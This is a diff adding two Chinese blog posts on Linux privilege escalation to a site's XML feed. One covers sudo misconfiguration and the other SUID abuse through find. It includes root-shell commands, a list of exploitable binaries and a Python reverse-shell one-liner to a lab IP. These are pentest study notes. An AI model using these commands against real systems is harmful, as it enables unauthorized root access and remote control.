@@ -4,6 +4,56 @@
   
   
   <entry>
+    <title>Linux提权之Sudo配置错误</title>
+    <link href="/post/undefined.html"/>
+    <url>/post/undefined.html</url>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。</p><p>管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。</p><p>一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>拿到普通用户权限之后，使用<code>sudo –l</code>查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。</p><pre><code class="hljs bash">sudo /usr/bin/find /home -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/01.jpg" alt="root"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>内网渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>提权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Linux提权之Suid提权</title>
+    <link href="/post/undefined.html"/>
+    <url>/post/undefined.html</url>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。例如，Linux ping命令通常需要root权限才能打开原始网络套接字。只要低特权用户执行suid权限程序，便会以root特权执行。</p><p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p><p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p><h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">NmapVimfindBashMoreLessNanocp</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p><p>该脚本的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre><p>执行LinEnum之后，发现find这个命令有SUID权限。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" alt="收集信息"></p><h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p><pre><code class="hljs bash">touch ice/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre><p>确认 find 命令是否是 root 权限执行.</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" alt="root"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p><pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre><p>结合 find :</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" alt="非root权限"></p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p><p>我们尝试使用如下命令获取 shell：</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" alt="提权成功"></p><p>可以看到获取的 shell 为 root 权限。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>内网渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>提权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Linux提权之定时任务</title>
     <link href="/post/75fd4604.html"/>
     <url>/post/75fd4604.html</url>
